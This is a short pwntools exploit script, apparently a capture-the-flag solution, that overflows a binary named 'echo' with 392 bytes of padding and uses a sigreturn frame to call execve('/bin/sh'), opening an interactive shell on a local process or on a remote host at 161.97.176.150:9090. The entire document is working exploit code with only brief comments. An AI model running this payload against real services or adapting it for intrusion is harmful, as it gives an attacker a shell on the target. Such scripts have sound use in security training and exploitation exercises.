#!/usr/bin/env python3
from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote('161.97.176.150', 9090)
    else:
        p = elf.process()

echo = 0x401000
syscall = 0x40104c
bin_sh = 0x401035
context.binary = elf = ELF('./echo')
libc = elf.libc
start()

# Fake frame to perform execve("/bin/sh", NULL, NULL)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = bin_sh
frame.rip = syscall 

# Set rax = 0xf to do SROP
payload = b'A'*392
payload += p64(echo)
payload += p64(syscall)
payload += bytes(frame)
p.send(payload)

time.sleep(0.2)

# for rax = 0xf
p.send(b'C'*0xf)
p.recv()
# Shell
p.interactive()
p.close()